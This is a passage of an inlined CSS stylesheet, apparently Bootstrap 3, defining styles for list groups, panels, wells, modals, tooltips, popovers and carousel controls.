            a.list-group-item:focus,
            button.list-group-item:hover,
            button.list-group-item:focus {
                text-decoration: none;
                color: #555;
                background-color: #f5f5f5;
            }
            button.list-group-item {
                width: 100%;
                text-align: left;
            }
            .list-group-item.disabled,
            .list-group-item.disabled:hover,
            .list-group-item.disabled:focus {
                background-color: #eeeeee;
                color: #777777;
                cursor: not-allowed;
            }
            .list-group-item.disabled .list-group-item-heading,
            .list-group-item.disabled:hover .list-group-item-heading,
            .list-group-item.disabled:focus .list-group-item-heading {
                color: inherit;
            }
            .list-group-item.disabled .list-group-item-text,
            .list-group-item.disabled:hover .list-group-item-text,
            .list-group-item.disabled:focus .list-group-item-text {
                color: #777777;
            }
            .list-group-item.active,
            .list-group-item.active:hover,
            .list-group-item.active:focus {
                z-index: 2;
                color: #fff;
                background-color: #337ab7;
                border-color: #337ab7;
            }
            .list-group-item.active .list-group-item-heading,
            .list-group-item.active .list-group-item-heading > small,
            .list-group-item.active .list-group-item-heading > .small,
            .list-group-item.active:hover .list-group-item-heading,
            .list-group-item.active:hover .list-group-item-heading > small,
            .list-group-item.active:hover .list-group-item-heading > .small,
            .list-group-item.active:focus .list-group-item-heading,
            .list-group-item.active:focus .list-group-item-heading > small,
            .list-group-item.active:focus .list-group-item-heading > .small {
                color: inherit;
            }
            .list-group-item.active .list-group-item-text,
            .list-group-item.active:hover .list-group-item-text,
            .list-group-item.active:focus .list-group-item-text {
                color: #c7ddef;
            }
            .list-group-item-success {
                color: #3c763d;
                background-color: #dff0d8;
            }
            a.list-group-item-success,
            button.list-group-item-success {
                color: #3c763d;
            }
            a.list-group-item-success .list-group-item-heading,
            button.list-group-item-success .list-group-item-heading {
                color: inherit;
            }
            a.list-group-item-success:hover,
            a.list-group-item-success:focus,
            button.list-group-item-success:hover,
            button.list-group-item-success:focus {
                color: #3c763d;
                background-color: #d0e9c6;
            }
            a.list-group-item-success.active,
            a.list-group-item-success.active:hover,
            a.list-group-item-success.active:focus,
            button.list-group-item-success.active,
            button.list-group-item-success.active:hover,
            button.list-group-item-success.active:focus {
                color: #fff;
                background-color: #3c763d;
                border-color: #3c763d;
            }
            .list-group-item-info {
                color: #31708f;
                background-color: #d9edf7;
            }
            a.list-group-item-info,
            button.list-group-item-info {
                color: #31708f;
            }
            a.list-group-item-info .list-group-item-heading,
            button.list-group-item-info .list-group-item-heading {
                color: inherit;
            }
            a.list-group-item-info:hover,
            a.list-group-item-info:focus,
            button.list-group-item-info:hover,
            button.list-group-item-info:focus {
                color: #31708f;
                background-color: #c4e3f3;
            }
            a.list-group-item-info.active,
            a.list-group-item-info.active:hover,
            a.list-group-item-info.active:focus,
            button.list-group-item-info.active,
            button.list-group-item-info.active:hover,
            button.list-group-item-info.active:focus {
                color: #fff;
                background-color: #31708f;
                border-color: #31708f;
            }
            .list-group-item-warning {
                color: #8a6d3b;
                background-color: #fcf8e3;
            }
            a.list-group-item-warning,
            button.list-group-item-warning {
                color: #8a6d3b;
            }
            a.list-group-item-warning .list-group-item-heading,
            button.list-group-item-warning .list-group-item-heading {
                color: inherit;
            }
            a.list-group-item-warning:hover,
            a.list-group-item-warning:focus,
            button.list-group-item-warning:hover,
            button.list-group-item-warning:focus {
                color: #8a6d3b;
                background-color: #faf2cc;
            }
            a.list-group-item-warning.active,
            a.list-group-item-warning.active:hover,
            a.list-group-item-warning.active:focus,
            button.list-group-item-warning.active,
            button.list-group-item-warning.active:hover,
            button.list-group-item-warning.active:focus {
                color: #fff;
                background-color: #8a6d3b;
                border-color: #8a6d3b;
            }
            .list-group-item-danger {
                color: #a94442;
                background-color: #f2dede;
            }
            a.list-group-item-danger,
            button.list-group-item-danger {
                color: #a94442;
            }
            a.list-group-item-danger .list-group-item-heading,
            button.list-group-item-danger .list-group-item-heading {
                color: inherit;
            }
            a.list-group-item-danger:hover,
            a.list-group-item-danger:focus,
            button.list-group-item-danger:hover,
            button.list-group-item-danger:focus {
                color: #a94442;
                background-color: #ebcccc;
            }
            a.list-group-item-danger.active,
            a.list-group-item-danger.active:hover,
            a.list-group-item-danger.active:focus,
            button.list-group-item-danger.active,
            button.list-group-item-danger.active:hover,
            button.list-group-item-danger.active:focus {
                color: #fff;
                background-color: #a94442;
                border-color: #a94442;
            }
            .list-group-item-heading {
                margin-top: 0;
                margin-bottom: 5px;
            }
            .list-group-item-text {
                margin-bottom: 0;
                line-height: 1.3;
            }
            .panel {
                margin-bottom: 20px;
                background-color: #fff;
                border: 1px solid transparent;
                border-radius: 4px;
                -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
                box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
            }
            .panel-body {
                padding: 15px;
            }
            .panel-body:before,
            .panel-body:after {
                content: " ";
                display: table;
            }
            .panel-body:after {
                clear: both;
            }
            .panel-heading {
                padding: 10px 15px;
                border-bottom: 1px solid transparent;
                border-top-right-radius: 3px;
                border-top-left-radius: 3px;
            }
            .panel-heading > .dropdown .dropdown-toggle {
                color: inherit;
            }
            .panel-title {
                margin-top: 0;
                margin-bottom: 0;
                font-size: 16px;
                color: inherit;
            }
            .panel-title > a,
            .panel-title > small,
            .panel-title > .small,
            .panel-title > small > a,
            .panel-title > .small > a {
                color: inherit;
            }
            .panel-footer {
                padding: 10px 15px;
                background-color: #f5f5f5;
                border-top: 1px solid #ddd;
                border-bottom-right-radius: 3px;
                border-bottom-left-radius: 3px;
            }
            .panel > .list-group,
            .panel > .panel-collapse > .list-group {
                margin-bottom: 0;
            }
            .panel > .list-group .list-group-item,
            .panel > .panel-collapse > .list-group .list-group-item {
                border-width: 1px 0;
                border-radius: 0;
            }
            .panel > .list-group:first-child .list-group-item:first-child,
            .panel > .panel-collapse > .list-group:first-child .list-group-item:first-child {
                border-top: 0;
                border-top-right-radius: 3px;
                border-top-left-radius: 3px;
            }
            .panel > .list-group:last-child .list-group-item:last-child,
            .panel > .panel-collapse > .list-group:last-child .list-group-item:last-child {
                border-bottom: 0;
                border-bottom-right-radius: 3px;
                border-bottom-left-radius: 3px;
            }
            .panel > .panel-heading + .panel-collapse > .list-group .list-group-item:first-child {
                border-top-right-radius: 0;
                border-top-left-radius: 0;
            }
            .panel-heading + .list-group .list-group-item:first-child {
                border-top-width: 0;
            }
            .list-group + .panel-footer {
                border-top-width: 0;
            }
            .panel > .table,
            .panel > .table-responsive > .table,
            .panel > .panel-collapse > .table {
                margin-bottom: 0;
            }
            .panel > .table caption,
            .panel > .table-responsive > .table caption,
            .panel > .panel-collapse > .table caption {
                padding-left: 15px;
                padding-right: 15px;
            }
            .panel > .table:first-child,
            .panel > .table-responsive:first-child > .table:first-child {
                border-top-right-radius: 3px;
                border-top-left-radius: 3px;
            }
            .panel > .table:first-child > thead:first-child > tr:first-child,
            .panel > .table:first-child > tbody:first-child > tr:first-child,
            .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child,
            .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child {
                border-top-left-radius: 3px;
                border-top-right-radius: 3px;
            }
            .panel > .table:first-child > thead:first-child > tr:first-child td:first-child,
            .panel > .table:first-child > thead:first-child > tr:first-child th:first-child,
            .panel > .table:first-child > tbody:first-child > tr:first-child td:first-child,
            .panel > .table:first-child > tbody:first-child > tr:first-child th:first-child,
            .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child td:first-child,
            .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child th:first-child,
            .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child td:first-child,
            .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child th:first-child {
                border-top-left-radius: 3px;
            }
            .panel > .table:first-child > thead:first-child > tr:first-child td:last-child,
            .panel > .table:first-child > thead:first-child > tr:first-child th:last-child,
            .panel > .table:first-child > tbody:first-child > tr:first-child td:last-child,
            .panel > .table:first-child > tbody:first-child > tr:first-child th:last-child,
            .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child td:last-child,
            .panel > .table-responsive:first-child > .table:first-child > thead:first-child > tr:first-child th:last-child,
            .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child td:last-child,
            .panel > .table-responsive:first-child > .table:first-child > tbody:first-child > tr:first-child th:last-child {
                border-top-right-radius: 3px;
            }
            .panel > .table:last-child,
            .panel > .table-responsive:last-child > .table:last-child {
                border-bottom-right-radius: 3px;
                border-bottom-left-radius: 3px;
            }
            .panel > .table:last-child > tbody:last-child > tr:last-child,
            .panel > .table:last-child > tfoot:last-child > tr:last-child,
            .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child,
            .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child {
                border-bottom-left-radius: 3px;
                border-bottom-right-radius: 3px;
            }
            .panel > .table:last-child > tbody:last-child > tr:last-child td:first-child,
            .panel > .table:last-child > tbody:last-child > tr:last-child th:first-child,
            .panel > .table:last-child > tfoot:last-child > tr:last-child td:first-child,
            .panel > .table:last-child > tfoot:last-child > tr:last-child th:first-child,
            .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child td:first-child,
            .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child th:first-child,
            .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child td:first-child,
            .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child th:first-child {
                border-bottom-left-radius: 3px;
            }
            .panel > .table:last-child > tbody:last-child > tr:last-child td:last-child,
            .panel > .table:last-child > tbody:last-child > tr:last-child th:last-child,
            .panel > .table:last-child > tfoot:last-child > tr:last-child td:last-child,
            .panel > .table:last-child > tfoot:last-child > tr:last-child th:last-child,
            .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child td:last-child,
            .panel > .table-responsive:last-child > .table:last-child > tbody:last-child > tr:last-child th:last-child,
            .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child td:last-child,
            .panel > .table-responsive:last-child > .table:last-child > tfoot:last-child > tr:last-child th:last-child {
                border-bottom-right-radius: 3px;
            }
            .panel > .panel-body + .table,
            .panel > .panel-body + .table-responsive,
            .panel > .table + .panel-body,
            .panel > .table-responsive + .panel-body {
                border-top: 1px solid #ddd;
            }
            .panel > .table > tbody:first-child > tr:first-child th,
            .panel > .table > tbody:first-child > tr:first-child td {
                border-top: 0;
            }
            .panel > .table-bordered,
            .panel > .table-responsive > .table-bordered {
                border: 0;
            }
            .panel > .table-bordered > thead > tr > th:first-child,
            .panel > .table-bordered > thead > tr > td:first-child,
            .panel > .table-bordered > tbody > tr > th:first-child,
            .panel > .table-bordered > tbody > tr > td:first-child,
            .panel > .table-bordered > tfoot > tr > th:first-child,
            .panel > .table-bordered > tfoot > tr > td:first-child,
            .panel > .table-responsive > .table-bordered > thead > tr > th:first-child,
            .panel > .table-responsive > .table-bordered > thead > tr > td:first-child,
            .panel > .table-responsive > .table-bordered > tbody > tr > th:first-child,
            .panel > .table-responsive > .table-bordered > tbody > tr > td:first-child,
            .panel > .table-responsive > .table-bordered > tfoot > tr > th:first-child,
            .panel > .table-responsive > .table-bordered > tfoot > tr > td:first-child {
                border-left: 0;
            }
            .panel > .table-bordered > thead > tr > th:last-child,
            .panel > .table-bordered > thead > tr > td:last-child,
            .panel > .table-bordered > tbody > tr > th:last-child,
            .panel > .table-bordered > tbody > tr > td:last-child,
            .panel > .table-bordered > tfoot > tr > th:last-child,
            .panel > .table-bordered > tfoot > tr > td:last-child,
            .panel > .table-responsive > .table-bordered > thead > tr > th:last-child,
            .panel > .table-responsive > .table-bordered > thead > tr > td:last-child,
            .panel > .table-responsive > .table-bordered > tbody > tr > th:last-child,
            .panel > .table-responsive > .table-bordered > tbody > tr > td:last-child,
            .panel > .table-responsive > .table-bordered > tfoot > tr > th:last-child,
            .panel > .table-responsive > .table-bordered > tfoot > tr > td:last-child {
                border-right: 0;
            }
            .panel > .table-bordered > thead > tr:first-child > td,
            .panel > .table-bordered > thead > tr:first-child > th,
            .panel > .table-bordered > tbody > tr:first-child > td,
            .panel > .table-bordered > tbody > tr:first-child > th,
            .panel > .table-responsive > .table-bordered > thead > tr:first-child > td,
            .panel > .table-responsive > .table-bordered > thead > tr:first-child > th,
            .panel > .table-responsive > .table-bordered > tbody > tr:first-child > td,
            .panel > .table-responsive > .table-bordered > tbody > tr:first-child > th {
                border-bottom: 0;
            }
            .panel > .table-bordered > tbody > tr:last-child > td,
            .panel > .table-bordered > tbody > tr:last-child > th,
            .panel > .table-bordered > tfoot > tr:last-child > td,
            .panel > .table-bordered > tfoot > tr:last-child > th,
            .panel > .table-responsive > .table-bordered > tbody > tr:last-child > td,
            .panel > .table-responsive > .table-bordered > tbody > tr:last-child > th,
            .panel > .table-responsive > .table-bordered > tfoot > tr:last-child > td,
            .panel > .table-responsive > .table-bordered > tfoot > tr:last-child > th {
                border-bottom: 0;
            }
            .panel > .table-responsive {
                border: 0;
                margin-bottom: 0;
            }
            .panel-group {
                margin-bottom: 20px;
            }
            .panel-group .panel {
                margin-bottom: 0;
                border-radius: 4px;
            }
            .panel-group .panel + .panel {
                margin-top: 5px;
            }
            .panel-group .panel-heading {
                border-bottom: 0;
            }
            .panel-group .panel-heading + .panel-collapse > .panel-body,
            .panel-group .panel-heading + .panel-collapse > .list-group {
                border-top: 1px solid #ddd;
            }
            .panel-group .panel-footer {
                border-top: 0;
            }
            .panel-group .panel-footer + .panel-collapse .panel-body {
                border-bottom: 1px solid #ddd;
            }
            .panel-default {
                border-color: #ddd;
            }
            .panel-default > .panel-heading {
                color: #333333;
                background-color: #f5f5f5;
                border-color: #ddd;
            }
            .panel-default > .panel-heading + .panel-collapse > .panel-body {
                border-top-color: #ddd;
            }
            .panel-default > .panel-heading .badge {
                color: #f5f5f5;
                background-color: #333333;
            }
            .panel-default > .panel-footer + .panel-collapse > .panel-body {
                border-bottom-color: #ddd;
            }
            .panel-primary {
                border-color: #337ab7;
            }
            .panel-primary > .panel-heading {
                color: #fff;
                background-color: #337ab7;
                border-color: #337ab7;
            }
            .panel-primary > .panel-heading + .panel-collapse > .panel-body {
                border-top-color: #337ab7;
            }
            .panel-primary > .panel-heading .badge {
                color: #337ab7;
                background-color: #fff;
            }
            .panel-primary > .panel-footer + .panel-collapse > .panel-body {
                border-bottom-color: #337ab7;
            }
            .panel-success {
                border-color: #d6e9c6;
            }
            .panel-success > .panel-heading {
                color: #3c763d;
                background-color: #dff0d8;
                border-color: #d6e9c6;
            }
            .panel-success > .panel-heading + .panel-collapse > .panel-body {
                border-top-color: #d6e9c6;
            }
            .panel-success > .panel-heading .badge {
                color: #dff0d8;
                background-color: #3c763d;
            }
            .panel-success > .panel-footer + .panel-collapse > .panel-body {
                border-bottom-color: #d6e9c6;
            }
            .panel-info {
                border-color: #bce8f1;
            }
            .panel-info > .panel-heading {
                color: #31708f;
                background-color: #d9edf7;
                border-color: #bce8f1;
            }
            .panel-info > .panel-heading + .panel-collapse > .panel-body {
                border-top-color: #bce8f1;
            }
            .panel-info > .panel-heading .badge {
                color: #d9edf7;
                background-color: #31708f;
            }
            .panel-info > .panel-footer + .panel-collapse > .panel-body {
                border-bottom-color: #bce8f1;
            }
            .panel-warning {
                border-color: #faebcc;
            }
            .panel-warning > .panel-heading {
                color: #8a6d3b;
                background-color: #fcf8e3;
                border-color: #faebcc;
            }
            .panel-warning > .panel-heading + .panel-collapse > .panel-body {
                border-top-color: #faebcc;
            }
            .panel-warning > .panel-heading .badge {
                color: #fcf8e3;
                background-color: #8a6d3b;
            }
            .panel-warning > .panel-footer + .panel-collapse > .panel-body {
                border-bottom-color: #faebcc;
            }
            .panel-danger {
                border-color: #ebccd1;
            }
            .panel-danger > .panel-heading {
                color: #a94442;
                background-color: #f2dede;
                border-color: #ebccd1;
            }
            .panel-danger > .panel-heading + .panel-collapse > .panel-body {
                border-top-color: #ebccd1;
            }
            .panel-danger > .panel-heading .badge {
                color: #f2dede;
                background-color: #a94442;
            }
            .panel-danger > .panel-footer + .panel-collapse > .panel-body {
                border-bottom-color: #ebccd1;
            }
            .embed-responsive {
                position: relative;
                display: block;
                height: 0;
                padding: 0;
                overflow: hidden;
            }
            .embed-responsive .embed-responsive-item,
            .embed-responsive iframe,
            .embed-responsive embed,
            .embed-responsive object,
            .embed-responsive video {
                position: absolute;
                top: 0;
                left: 0;
                bottom: 0;
                height: 100%;
                width: 100%;
                border: 0;
            }
            .embed-responsive-16by9 {
                padding-bottom: 56.25%;
            }
            .embed-responsive-4by3 {
                padding-bottom: 75%;
            }
            .well {
                min-height: 20px;
                padding: 19px;
                margin-bottom: 20px;
                background-color: #f5f5f5;
                border: 1px solid #e3e3e3;
                border-radius: 4px;
                -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.05);
                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.05);
            }
            .well blockquote {
                border-color: #ddd;
                border-color: rgba(0, 0, 0, 0.15);
            }
            .well-lg {
                padding: 24px;
                border-radius: 6px;
            }
            .well-sm {
                padding: 9px;
                border-radius: 3px;
            }
            .close {
                float: right;
                font-size: 21px;
                font-weight: bold;
                line-height: 1;
                color: #000;
                text-shadow: 0 1px 0 #fff;
                opacity: 0.2;
                filter: alpha(opacity=20);
            }
            .close:hover,
            .close:focus {
                color: #000;
                text-decoration: none;
                cursor: pointer;
                opacity: 0.5;
                filter: alpha(opacity=50);
            }
            button.close {
                padding: 0;
                cursor: pointer;
                background: transparent;
                border: 0;
                -webkit-appearance: none;
            }
            .modal-open {
                overflow: hidden;
            }
            .modal {
                display: none;
                overflow: hidden;
                position: fixed;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                z-index: 1050;
                -webkit-overflow-scrolling: touch;
                outline: 0;
            }
            .modal.fade .modal-dialog {
                -webkit-transform: translate(0, -25%);
                -ms-transform: translate(0, -25%);
                -o-transform: translate(0, -25%);
                transform: translate(0, -25%);
                -webkit-transition: -webkit-transform 0.3s ease-out;
                -moz-transition: -moz-transform 0.3s ease-out;
                -o-transition: -o-transform 0.3s ease-out;
                transition: transform 0.3s ease-out;
            }
            .modal.in .modal-dialog {
                -webkit-transform: translate(0, 0);
                -ms-transform: translate(0, 0);
                -o-transform: translate(0, 0);
                transform: translate(0, 0);
            }
            .modal-open .modal {
                overflow-x: hidden;
                overflow-y: auto;
            }
            .modal-dialog {
                position: relative;
                width: auto;
                margin: 10px;
            }
            .modal-content {
                position: relative;
                background-color: #fff;
                border: 1px solid #999;
                border: 1px solid rgba(0, 0, 0, 0.2);
                border-radius: 6px;
                -webkit-box-shadow: 0 3px 9px rgba(0, 0, 0, 0.5);
                box-shadow: 0 3px 9px rgba(0, 0, 0, 0.5);
                background-clip: padding-box;
                outline: 0;
            }
            .modal-backdrop {
                position: fixed;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                z-index: 1040;
                background-color: #000;
            }
            .modal-backdrop.fade {
                opacity: 0;
                filter: alpha(opacity=0);
            }
            .modal-backdrop.in {
                opacity: 0.5;
                filter: alpha(opacity=50);
            }
            .modal-header {
                padding: 15px;
                border-bottom: 1px solid #e5e5e5;
            }
            .modal-header:before,
            .modal-header:after {
                content: " ";
                display: table;
            }
            .modal-header:after {
                clear: both;
            }
            .modal-header .close {
                margin-top: -2px;
            }
            .modal-title {
                margin: 0;
                line-height: 1.428571429;
            }
            .modal-body {
                position: relative;
                padding: 15px;
            }
            .modal-footer {
                padding: 15px;
                text-align: right;
                border-top: 1px solid #e5e5e5;
            }
            .modal-footer:before,
            .modal-footer:after {
                content: " ";
                display: table;
            }
            .modal-footer:after {
                clear: both;
            }
            .modal-footer .btn + .btn {
                margin-left: 5px;
                margin-bottom: 0;
            }
            .modal-footer .btn-group .btn + .btn {
                margin-left: -1px;
            }
            .modal-footer .btn-block + .btn-block {
                margin-left: 0;
            }
            .modal-scrollbar-measure {
                position: absolute;
                top: -9999px;
                width: 50px;
                height: 50px;
                overflow: scroll;
            }
            @media (min-width: 768px) {
                .modal-dialog {
                    width: 600px;
                    margin: 30px auto;
                }
                .modal-content {
                    -webkit-box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
                    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
                }
                .modal-sm {
                    width: 300px;
                }
            }
            @media (min-width: 992px) {
                .modal-lg {
                    width: 900px;
                }
            }
            .tooltip {
                position: absolute;
                z-index: 1070;
                display: block;
                font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
                font-style: normal;
                font-weight: normal;
                letter-spacing: normal;
                line-break: auto;
                line-height: 1.428571429;
                text-align: left;
                text-align: start;
                text-decoration: none;
                text-shadow: none;
                text-transform: none;
                white-space: normal;
                word-break: normal;
                word-spacing: normal;
                word-wrap: normal;
                font-size: 12px;
                opacity: 0;
                filter: alpha(opacity=0);
            }
            .tooltip.in {
                opacity: 0.9;
                filter: alpha(opacity=90);
            }
            .tooltip.top {
                margin-top: -3px;
                padding: 5px 0;
            }
            .tooltip.right {
                margin-left: 3px;
                padding: 0 5px;
            }
            .tooltip.bottom {
                margin-top: 3px;
                padding: 5px 0;
            }
            .tooltip.left {
                margin-left: -3px;
                padding: 0 5px;
            }
            .tooltip-inner {
                max-width: 200px;
                padding: 3px 8px;
                color: #fff;
                text-align: center;
                background-color: #000;
                border-radius: 4px;
            }
            .tooltip-arrow {
                position: absolute;
                width: 0;
                height: 0;
                border-color: transparent;
                border-style: solid;
            }
            .tooltip.top .tooltip-arrow {
                bottom: 0;
                left: 50%;
                margin-left: -5px;
                border-width: 5px 5px 0;
                border-top-color: #000;
            }
            .tooltip.top-left .tooltip-arrow {
                bottom: 0;
                right: 5px;
                margin-bottom: -5px;
                border-width: 5px 5px 0;
                border-top-color: #000;
            }
            .tooltip.top-right .tooltip-arrow {
                bottom: 0;
                left: 5px;
                margin-bottom: -5px;
                border-width: 5px 5px 0;
                border-top-color: #000;
            }
            .tooltip.right .tooltip-arrow {
                top: 50%;
                left: 0;
                margin-top: -5px;
                border-width: 5px 5px 5px 0;
                border-right-color: #000;
            }
            .tooltip.left .tooltip-arrow {
                top: 50%;
                right: 0;
                margin-top: -5px;
                border-width: 5px 0 5px 5px;
                border-left-color: #000;
            }
            .tooltip.bottom .tooltip-arrow {
                top: 0;
                left: 50%;
                margin-left: -5px;
                border-width: 0 5px 5px;
                border-bottom-color: #000;
            }
            .tooltip.bottom-left .tooltip-arrow {
                top: 0;
                right: 5px;
                margin-top: -5px;
                border-width: 0 5px 5px;
                border-bottom-color: #000;
            }
            .tooltip.bottom-right .tooltip-arrow {
                top: 0;
                left: 5px;
                margin-top: -5px;
                border-width: 0 5px 5px;
                border-bottom-color: #000;
            }
            .popover {
                position: absolute;
                top: 0;
                left: 0;
                z-index: 1060;
                display: none;
                max-width: 276px;
                padding: 1px;
                font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
                font-style: normal;
                font-weight: normal;
                letter-spacing: normal;
                line-break: auto;
                line-height: 1.428571429;
                text-align: left;
                text-align: start;
                text-decoration: none;
                text-shadow: none;
                text-transform: none;
                white-space: normal;
                word-break: normal;
                word-spacing: normal;
                word-wrap: normal;
                font-size: 14px;
                background-color: #fff;
                background-clip: padding-box;
                border: 1px solid #ccc;
                border: 1px solid rgba(0, 0, 0, 0.2);
                border-radius: 6px;
                -webkit-box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
                box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
            }
            .popover.top {
                margin-top: -10px;
            }
            .popover.right {
                margin-left: 10px;
            }
            .popover.bottom {
                margin-top: 10px;
            }
            .popover.left {
                margin-left: -10px;
            }
            .popover-title {
                margin: 0;
                padding: 8px 14px;
                font-size: 14px;
                background-color: #f7f7f7;
                border-bottom: 1px solid #ebebeb;
                border-radius: 5px 5px 0 0;
            }
            .popover-content {
                padding: 9px 14px;
            }
            .popover > .arrow,
            .popover > .arrow:after {
                position: absolute;
                display: block;
                width: 0;
                height: 0;
                border-color: transparent;
                border-style: solid;
            }
            .popover > .arrow {
                border-width: 11px;
            }
            .popover > .arrow:after {
                border-width: 10px;
                content: "";
            }
            .popover.top > .arrow {
                left: 50%;
                margin-left: -11px;
                border-bottom-width: 0;
                border-top-color: #999999;
                border-top-color: rgba(0, 0, 0, 0.25);
                bottom: -11px;
            }
            .popover.top > .arrow:after {
                content: " ";
                bottom: 1px;
                margin-left: -10px;
                border-bottom-width: 0;
                border-top-color: #fff;
            }
            .popover.right > .arrow {
                top: 50%;
                left: -11px;
                margin-top: -11px;
                border-left-width: 0;
                border-right-color: #999999;
                border-right-color: rgba(0, 0, 0, 0.25);
            }
            .popover.right > .arrow:after {
                content: " ";
                left: 1px;
                bottom: -10px;
                border-left-width: 0;
                border-right-color: #fff;
            }
            .popover.bottom > .arrow {
                left: 50%;
                margin-left: -11px;
                border-top-width: 0;
                border-bottom-color: #999999;
                border-bottom-color: rgba(0, 0, 0, 0.25);
                top: -11px;
            }
            .popover.bottom > .arrow:after {
                content: " ";
                top: 1px;
                margin-left: -10px;
                border-top-width: 0;
                border-bottom-color: #fff;
            }
            .popover.left > .arrow {
                top: 50%;
                right: -11px;
                margin-top: -11px;
                border-right-width: 0;
                border-left-color: #999999;
                border-left-color: rgba(0, 0, 0, 0.25);
            }
            .popover.left > .arrow:after {
                content: " ";
                right: 1px;
                border-right-width: 0;
                border-left-color: #fff;
                bottom: -10px;
            }
            .carousel {
                position: relative;
            }
            .carousel-inner {
                position: relative;
                overflow: hidden;
                width: 100%;
            }
            .carousel-inner > .item {
                display: none;
                position: relative;
                -webkit-transition: 0.6s ease-in-out left;
                -o-transition: 0.6s ease-in-out left;
                transition: 0.6s ease-in-out left;
            }
            .carousel-inner > .item > img,
            .carousel-inner > .item > a > img {
                display: block;
                max-width: 100%;
                height: auto;
                line-height: 1;
            }
            @media all and (transform-3d), (-webkit-transform-3d) {
                .carousel-inner > .item {
                    -webkit-transition: -webkit-transform 0.6s ease-in-out;
                    -moz-transition: -moz-transform 0.6s ease-in-out;
                    -o-transition: -o-transform 0.6s ease-in-out;
                    transition: transform 0.6s ease-in-out;
                    -webkit-backface-visibility: hidden;
                    -moz-backface-visibility: hidden;
                    backface-visibility: hidden;
                    -webkit-perspective: 1000px;
                    -moz-perspective: 1000px;
                    perspective: 1000px;
                }
                .carousel-inner > .item.next,
                .carousel-inner > .item.active.right {
                    -webkit-transform: translate3d(100%, 0, 0);
                    transform: translate3d(100%, 0, 0);
                    left: 0;
                }
                .carousel-inner > .item.prev,
                .carousel-inner > .item.active.left {
                    -webkit-transform: translate3d(-100%, 0, 0);
                    transform: translate3d(-100%, 0, 0);
                    left: 0;
                }
                .carousel-inner > .item.next.left,
                .carousel-inner > .item.prev.right,
                .carousel-inner > .item.active {
                    -webkit-transform: translate3d(0, 0, 0);
                    transform: translate3d(0, 0, 0);
                    left: 0;
                }
            }
            .carousel-inner > .active,
            .carousel-inner > .next,
            .carousel-inner > .prev {
                display: block;
            }
            .carousel-inner > .active {
                left: 0;
            }
            .carousel-inner > .next,
            .carousel-inner > .prev {
                position: absolute;
                top: 0;
                width: 100%;
            }
            .carousel-inner > .next {
                left: 100%;
            }
            .carousel-inner > .prev {
                left: -100%;
            }
            .carousel-inner > .next.left,
            .carousel-inner > .prev.right {
                left: 0;
            }
            .carousel-inner > .active.left {
                left: -100%;
            }
            .carousel-inner > .active.right {
                left: 100%;
            }
            .carousel-control {
                position: absolute;
                top: 0;
                left: 0;
                bottom: 0;
                width: 15%;
                opacity: 0.5;
                filter: alpha(opacity=50);
                font-size: 20px;
                color: #fff;
                text-align: center;
                text-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
                background-color: rgba(0, 0, 0, 0);
            }
            .carousel-control.left {
                background-image: -webkit-linear-gradient(left, rgba(0, 0, 0, 0.5) 0%, rgba(0, 0, 0, 0.0001) 100%);
                background-image: -o-linear-gradient(left, rgba(0, 0, 0, 0.5) 0%, rgba(0, 0, 0, 0.0001) 100%);
                background-image: linear-gradient(to right, rgba(0, 0, 0, 0.5) 0%, rgba(0, 0, 0, 0.0001) 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#80000000', endColorstr='#00000000', GradientType=1);
            }
            .carousel-control.right {
                left: auto;
                right: 0;
                background-image: -webkit-linear-gradient(left, rgba(0, 0, 0, 0.0001) 0%, rgba(0, 0, 0, 0.5) 100%);
                background-image: -o-linear-gradient(left, rgba(0, 0, 0, 0.0001) 0%, rgba(0, 0, 0, 0.5) 100%);
                background-image: linear-gradient(to right, rgba(0, 0, 0, 0.0001) 0%, rgba(0, 0, 0, 0.5) 100%);
                background-repeat: repeat-x;
                filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#00000000', endColorstr='#80000000', GradientType=1);
            }
            .carousel-control:hover,
            .carousel-control:focus {
                outline: 0;
                color: #fff;
                text-decoration: none;
                opacity: 0.9;
                filter: alpha(opacity=90);
            }
            .carousel-control .icon-prev,
            .carousel-control .icon-next,
            .carousel-control .glyphicon-chevron-left,
            .carousel-control .glyphicon-chevron-right {
                position: absolute;
                top: 50%;
                margin-top: -10px;
                z-index: 5;
                display: inline-block;
            }
            .carousel-control .icon-prev,
            .carousel-control .glyphicon-chevron-left {
                left: 50%;
                margin-left: -10px;
            }
            .carousel-control .icon-next,
            .carousel-control .glyphicon-chevron-right {
                right: 50%;
                margin-right: -10px;
            }
            .carousel-control .icon-prev,
            .carousel-control .icon-next {
                width: 20px;
                height: 20px;
                line-height: 1;
                font-family: serif;
            }
            .carousel-control .icon-prev:before {
                content: "\2039";
            }
            .carousel-control .icon-next:before {
                content: "\203a";
            }
            .carousel-indicators {
                position: absolute;
